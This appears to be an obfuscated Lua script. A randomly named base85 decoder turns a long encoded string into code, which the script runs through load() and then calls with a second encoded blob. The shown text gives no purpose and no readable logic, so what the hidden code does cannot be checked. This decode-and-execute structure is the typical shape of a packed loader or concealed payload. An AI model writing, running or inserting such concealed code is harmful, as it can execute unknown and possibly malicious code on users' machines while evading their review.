
local function ParmpHPtdJ(s)
    local m = {}
    local c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)] = i-1 end
    local o, v, n, p = {}, 0, 0, {52200625, 614125, 7225, 85, 1}
    for i=1, #s do
        local x = m[string.byte(s,i)]
        if x then
            v = v + x * p[n+1]
            n = n + 1
            if n == 5 then
                table.insert(o, string.char(math.floor(v/16777216), math.floor((v%16777216)/65536), math.floor((v%65536)/256), v%256))
                v, n = 0, 0
            end
        end
    end
    return table.concat(o)
end
assert(load(ParmpHPtdJ("3LqdLAZ%}AVQe6FdS-J*SXpmZOCUWUb98cPZf7oIXkl_FH!CzXEH^hRGcqhPHY+kREHgDLF*PhPGC3_WG%PVQH!U+YEHXJOGBhkPGcheOI4m(UGA%JSEHN`HGdC<aGb=GSEI2SLGcYVMFf%POH7qkWD>5-GH#jRYH7qeQG%YeUEH*eRG&3wWG%GYQEHN-MEi*AJF)}nQF*htYF)cAREHN-REi^GKGc_wSI4n6ZEi*SPH#I9XFf2GYD>E}JF*Y?VG&C$VG%GSNEHX1IGB+$VG%GSWEHXJOGBqqYH7ztVDGDGUARugSV_|F{W_503bZKvHAWcbgaY;^TRZ>wXVJu=PAZ%}AVQe69EMq+}EHFDDcW7yBWguZbFd$)WWFTTbFd$@aAZ%}AVQe6BVJvcDJz*s>EMg@xJ0NLhAaY@TJ#u0obZBL6AY(maD{vrXZe%+kVJu=Sa6KqtEplNgFET7BVl8rFDK9cCa4Ir8AZ2c3J0NLhAYnXWAarPDZXjVjVjyL1WIG^tXlZO^AYnc*AY^YKY;R*>Y#?%BJz*s>J0NLhAaY?oFd%ejWo{s2J!30yAZ2c3J0M{!a6KqtEplNgFET7}Dl$7DWo~3UAaZ4Nb#iVXV>=*aZe%+OARr(hY;R*>Y#?TJZew(5Z*Cw_a7=PxV`Xt!SSVyHAZsZKARr(hARr(hY;R*>Y#?(WJs^91AZBlJAZa}?EHX7UAY^YKb6aU$J!v3iZe$7|ARr(hARr)YZ)0I>AZj2zATSCbARr(hARr)SZ*m}MJuoaXH8mh)ZweqFARr(hARr(hARuZWJs>D*AS)nqTWMV&D<E@pa%pa7E@F9fWhiSbASh`dB_JbfDIhB#F)1k^B_J|2HVPmhARr(hARr(hARu#FX<aNJb6aX%AUz;+TWVb_Aah%3T?!x|ARr(hARuLKWC|c4ARr(hARugSV_|F{X)GXbb#x#-ATTT-dwmKZARr(hARr)WAUz;33LqdLARr(hAZBlJAZcWHJuxgGBV-_CZweqFARr(hARr(hARuWVJs>D)AS)m-DIg^vGBq{|ARr(hARr(hARr(hY9KuzC~6=pAah%3T`3?XATl*J3LqdLARr(hARr(hAah%3T`VATTWVb(Js@*iYF#WKb6aU$3LqdLARr(hARr(hAa8YaTO)6EbSp7kAUz;+baH8KXD(xCVR9%<Npo>YPH9zAQ7ChCa%pa7E@F9fWhi7UAZcWHDJ&p!TPSl|X<Z;IAah%4T`3?XATl*JT`4IFARr(hARr(hWo~2&ARr(hARr(ha%FUNa&91WVPb4$E@N+QV_|eCZ*_Dj3LqdLAZ2c33LqdLAaZ4Nb#iVXW_503bZKvHC~#k5I5jB>ARr(hARr(hY;R*>Y#?o6a3DP(dwmKZARr(hARr)YZ)0I>AY*7@a&sU(AR;g^GBY$aHa9pqK|(`BMMg(RNlHshO-@fxQBqS>RaRG6Sz2LYV`OD!XJ~0^Yiw<9Z*XyPb98lfcX)YvAtNLuCMYQ?D=j-bJw87`USD8)e0_c*3LqdLARr(hAZBlJAZa}@EI2hFWN#pCVQ^b>baH8KXD(uSbY&=GXkl`5ENLlSAUz;yEioWvZe$7|ARr(hARr)YZ)0I>Aa8YaEFgAaY%CySZ*^{TAUz;^eJmg_EFdrnARr(hARr(hY;R*>Y#?xNcXJ>;AbT}3GB7YUGBqq9HZe3YGBqq9H!?CcEFd^FEFdv`3LqdLARr(hAZBlJAZa}@EFdFrUt%~lAY^X}ARr(hARr(hARr(hY;R*>Y#??ZJs@pia9eY9a%pa7E@F9fWhii8VmLJ{AZaOG3LqdLARr(hARr(hAZcbGb|7?UWo`-}ARr(hARr(hARr(hARr)iVQe5hAa-GFAS)ntASxhmZ+CNBV{dhCbSp7k3LqdLARr(hARr(hARr(hAY*TJZge0$AY*TJZge0kATbIcARr(hARr(hARr(hARr)VW*}p4b#8PZJv|^bAarPDZVDhEARr(hARr(hARr(hARr(hARu&MVr*qDX>N06a&#zfb#yEsb98cPZf7oIXkl_FZDDk1E@o_RZ*nMhVQeokHa9mnGBGwOEFf)RbZ9PSY;SLJC@6MeY$Y)^H#avjF*YeLHZ?UfHYqG1ZDDk1E@o_RZ*nLoc42HKHZ?UfHYqPMH8v?MAa-GFB{DTODJcpdARr(hARr(hARr(hARr(hARr)iVQefQV{dhCbRaz-Ff1T23LqdLARr(hARr(hARr(hAZ2c33LqdLARr(hARr(hAZ2c33LqdLARr(hAZ2c33LqdLARr(hAZ%}AVQe5|Wn*%AaCBv4AUz;aa7=PxV`Xt!SSWO1Vr*qDV{dL_VRR^Ob#y5#Aa;6Yb4FNMZ&ynx3LqdLARr(hAYpTJWpZ>VY;R#?C}d@0a(QrcWn?KSC@BgcARr)RZe$7|ARr(")))()("F^E0GGAm8Xq6(nk=?YvRxP@?(zHCdhgwDSR$3Ib_YISvwz=qF%%^1emyx3koGFc72AhDjhI<F_(w2E2Mux^8sRN18!fcedA83>0FX?hU98${yFQ44&RPieu0Y|4%I&7}n6?Gtuz(#2$kU~&iu($pb+?QkjRsh#H0qxH#|;ykL3A(sjo8yG;L-9owiNpR`Hyv01+5$%G8!FikLh6}ciDOBibbA8K0wWSXlW`y*ws?_=M4@5;UfRB8RAbYlt-PDOvaaH{Swp#gDEfUvXs!wODROue*AMbk_;sTaHTLYqqhI-d0ps6uo=TpV4r+E&gaQL}{bOa9PYPncDaZWK3{9NWdg`En!1I8G*#sw94tQrPGj}118+VTJOXx9?3+1=t5NnpXMiEA%+brpIk;zgrZx5hc+`jV6!4`!C_+UBUV4J=gHD%bUL<oAWHNW3WIpjuJCSjd{rCWW`Upt-<%v+j2d#NKHcWGzKusnRT@LB3vIiH#o9PDz}WJIdlH2-UMz7TN-@Jv*F6nET0!r0)Q?jg{s*FKMGIHn?S&1-GNV8p6%kaB)zcu}=(JS?QZjBr0+XnLTp`M<f-&fiyRN3jD3^`7v8`)9421{8`R40UVpYzh{^|($J*ERPxMtCo9-qUo0Yt&-!hICG@(vsuQquLgVTOXm?m;C?@ACKVPTY$CXp3xE3%4Er2Xyc%S3udjvuYq-sH8d+!KSVQh*2!4q1Y0X8H11PFCGQ}sh%%{R0TFa2Fe;WC()DDCf0>c{f*;@4mr9Q@18*Gy!Sh?iIu3_Y%K$4zWw#`mklAqM#$MBfc^)FUA6D%emM!D^fvBi`H^Ug`DEL(MdZBpFQ^$!EWImqAl%>M+QWGk|Hp<bAUr>&uWm821x*)<0-D+tp16se#2YQ<&6HMa1M-(*2zaz+)Tk*#")
